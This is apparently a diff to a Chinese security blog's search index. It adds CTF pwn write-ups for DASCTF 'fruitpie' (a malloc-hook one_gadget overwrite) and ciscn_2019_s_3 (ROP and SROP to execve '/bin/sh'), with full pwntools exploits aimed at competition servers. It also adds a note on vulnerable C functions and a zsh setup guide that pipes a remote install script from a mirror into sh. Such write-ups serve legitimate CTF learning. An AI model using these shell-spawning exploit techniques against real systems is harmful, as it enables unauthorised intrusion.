@@ -139,6 +139,44 @@
       </categories>
   </entry>
   <entry>
+    <title>DASCTF_2021_3</title>
+    <url>/2021/04/06/DASCTF/</url>
+    <content><![CDATA[<p>DASCTF 2021三月赛</p>
+<span id="more"></span>
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><p>保护全开</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>IDA</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  LODWORD(size) = readInt(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Offset:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v5[*(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>)], <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用思路</p>
+<ul>
+<li>获取libc_base：当申请一个足够大的堆时会由mmap分配，此时程序会给我们chunk的地址，而这个地址紧挨着libc并且偏移固定</li>
+<li>将one_gadget写到realloc_hook地址中，在malloc_hook的地址写入realloc + x来调整栈帧，x的取值可以有2，4，6，8，9。</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10018</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./fruitpie&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the size to malloc:&#x27;</span>,<span class="string">&#x27;99999999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr + <span class="number">0x5f5eff0</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">realloc_hook = malloc_hook - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>] <span class="comment">#0x4f3c2</span></span><br><span class="line"></span><br><span class="line">offset = realloc_hook - addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Data:&#x27;</span>,p64(one_gadget) + p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>C语言中常见漏洞点</title>
+    <url>/2021/05/11/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%82%B9/</url>
+    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Canary</title>
     <url>/2021/03/25/Canary/</url>
     <content><![CDATA[<h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><span id="more"></span>
@@ -234,44 +272,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言中常见漏洞点</title>
-    <url>/2021/05/11/C/</url>
-    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
-
-<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
-<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DASCTF_2021_3</title>
-    <url>/2021/04/06/DASCTF_2021_3/</url>
-    <content><![CDATA[<p>DASCTF 2021三月赛</p>
-<span id="more"></span>
-
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><p>保护全开</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-
-<p>IDA</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  LODWORD(size) = readInt(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Offset:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v5[*(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>)], <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>利用思路</p>
-<ul>
-<li>获取libc_base：当申请一个足够大的堆时会由mmap分配，此时程序会给我们chunk的地址，而这个地址紧挨着libc并且偏移固定</li>
-<li>将one_gadget写到realloc_hook地址中，在malloc_hook的地址写入realloc + x来调整栈帧，x的取值可以有2，4，6，8，9。</li>
-</ul>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10018</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./fruitpie&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the size to malloc:&#x27;</span>,<span class="string">&#x27;99999999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr + <span class="number">0x5f5eff0</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">realloc_hook = malloc_hook - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>] <span class="comment">#0x4f3c2</span></span><br><span class="line"></span><br><span class="line">offset = realloc_hook - addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Data:&#x27;</span>,p64(one_gadget) + p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>EIP</title>
     <url>/2021/03/30/EIP/</url>
     <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
@@ -342,7 +342,7 @@
   </entry>
   <entry>
     <title>HGame</title>
-    <url>/2021/03/30/HGame/</url>
+    <url>/2021/03/30/Hgame/</url>
     <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><span id="more"></span>
 <h2 id="once-格式化字符串"><a href="#once-格式化字符串" class="headerlink" title="once(格式化字符串)"></a>once(格式化字符串)</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p>
 <p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p>
@@ -584,8 +584,118 @@
       </categories>
   </entry>
   <entry>
+    <title>SROP</title>
+    <url>/2021/03/24/SROP/</url>
+    <content><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><span id="more"></span>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="_ciscn_2019_s_3"></a>_ciscn_2019_s_3</h2><p>main里只有一个vuln函数<br>直接进去看</p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202170418.png" alt="205415324135211"></p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202171801.png" alt="202"></p>
+<p>看汇编分析：</p>
+<p>需要在栈上构造/bin/sh，并且需要rax=59让64位的syscall执行execve才能getshell</p>
+<p>64 位：系统调用号放入 rax，参数依次放到 rdi、rsi、rdx，返回值放在 rax</p>
+<p>64位程序前六个寄存器调用顺序：rdi rsi rdx rcx r8 r9</p>
+<p>寄存器大概布局：<br>rax = 59<br>rdi = /bin/sh<br>rsi = 0<br>rdx = 0</p>
+<p>注意到vuln函数末尾并没有使用leave指令，即直接把之前push的rbp当作return address<br>我们要ROP的话offset只需要0x10</p>
+<p>先构造/bin/sh在栈中</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211800.png" alt="20201202211800"></p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211855.png" alt="20201202211855"></p>
+<p>发现/bin/sh已经在栈中了，在打印到0x20的时候，接下来是打印出来一个地址，这也是为什么需要recv的原因，这个地址是栈上面的，所以只要算出这个地址和/bin/sh地址的相对偏移，就可以在程序每次执行的时候算出binsh的地址了，因为地址会变，但是偏移不会</p>
+<p>我们输出了地址stack_addr</p>
+<p>计算偏移量 0x7ffdc7824d78 - 0x007FFDC7824C60 = 0x118</p>
+<p>所以计算binsh_addr = stack_addr - 0x118</p>
+<p>构造完/bin/sh之后，在程序中有给我们一个gadgets函数：</p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203155951.png" alt="20201203155951"></p>
+<p>只要我们跳到地址0x4004E2就能把3Bh（59）赋值给rax，这样系统调用号的参数也搞定了</p>
+<p>接下来可以利用csu把 rsi = 0，rdx = 0 ，最后用pop rdi ; ret存上/bin/sh就万事大吉了</p>
+<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203161803.png" alt="20201203161803"></p>
+<p>需要注意的是call这个地方call的是r12地址上的内容，我们这里要call的是mov rax,3Bh ，而mov rax,3Bh可以存在/bin/sh\x00aaaaaaaa(一共长0x10)后面，所以r12 = binsh_addr + 0x10</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27933</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_r13 = <span class="number">0x400580</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(mov_rax_59) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_14_r15) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr+<span class="number">0x10</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_r13) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">6</span>*<span class="number">8</span>+<span class="number">8</span>) </span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/edumds">参考链接</a></p>
+<h2 id="SROP-1"><a href="#SROP-1" class="headerlink" title="SROP"></a>SROP</h2><p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.binary=(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(pl1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip= sys</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(pl2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">参考链接</a></p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>SROP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu20_zsh</title>
+    <url>/2021/07/24/Ubuntu20-zsh/</url>
+    <content><![CDATA[<h1 id="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"><a href="#Ubuntu20下zsh、oh-my-zsh、插件和主题安装" class="headerlink" title="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"></a>Ubuntu20下zsh、oh-my-zsh、插件和主题安装</h1><p>之前ubuntu16 18都没写过自己安装zsh的过程，借此次ubuntu20顺手写一下</p>
+<span id="more"></span>
+
+<h2 id="检查当前可用的shell："><a href="#检查当前可用的shell：" class="headerlink" title="检查当前可用的shell："></a>检查当前可用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看当前使用的shell："><a href="#查看当前使用的shell：" class="headerlink" title="查看当前使用的shell："></a>查看当前使用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure>
+
+<h2 id="把默认的Shell改成zsh"><a href="#把默认的Shell改成zsh" class="headerlink" title="把默认的Shell改成zsh"></a>把默认的Shell改成zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
+
+<p>注意：不要使用sudo</p>
+<h2 id="配置密码文件，解决chsh-PAM认证失败的问题"><a href="#配置密码文件，解决chsh-PAM认证失败的问题" class="headerlink" title="配置密码文件，解决chsh: PAM认证失败的问题"></a>配置密码文件，解决chsh: PAM认证失败的问题</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.ink//image-20210724130411040.png" alt="image-20210724130411041"></p>
+<h2 id="安装-curl"><a href="#安装-curl" class="headerlink" title="安装 curl"></a>安装 curl</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><p>curl：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<p>wget：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.ink//image-20210724130842599.png" alt="image-20210724130842599"></p>
+<h2 id="下载-zsh-syntax-highlighting-语法高亮插件"><a href="#下载-zsh-syntax-highlighting-语法高亮插件" class="headerlink" title="下载 zsh-syntax-highlighting 语法高亮插件"></a>下载 zsh-syntax-highlighting 语法高亮插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
+
+<h2 id="下载-zsh-autosuggestions-自动提示插件"><a href="#下载-zsh-autosuggestions-自动提示插件" class="headerlink" title="下载 zsh-autosuggestions 自动提示插件"></a>下载 zsh-autosuggestions 自动提示插件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置生效"><a href="#配置生效" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置-zshrc文件"><a href="#配置-zshrc文件" class="headerlink" title="配置.zshrc文件"></a>配置.zshrc文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>plugins=(git zsh-syntax-highlighting zsh-autosuggestions)</p>
+</blockquote>
+<h1 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h1><h2 id="下载powerline"><a href="#下载powerline" class="headerlink" title="下载powerline"></a>下载powerline</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install powerline-status --user</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装PowerFonts"><a href="#安装PowerFonts" class="headerlink" title="安装PowerFonts"></a>安装PowerFonts</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/powerline/fonts.git --depth=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> fonts</span><br><span class="line"></span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fcamblor/oh-my-zsh-agnoster-fcamblor.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> oh-my-zsh-agnoster-fcamblor/</span><br><span class="line"></span><br><span class="line">./install</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ZSH_THEME=”agnoster”</p>
+</blockquote>
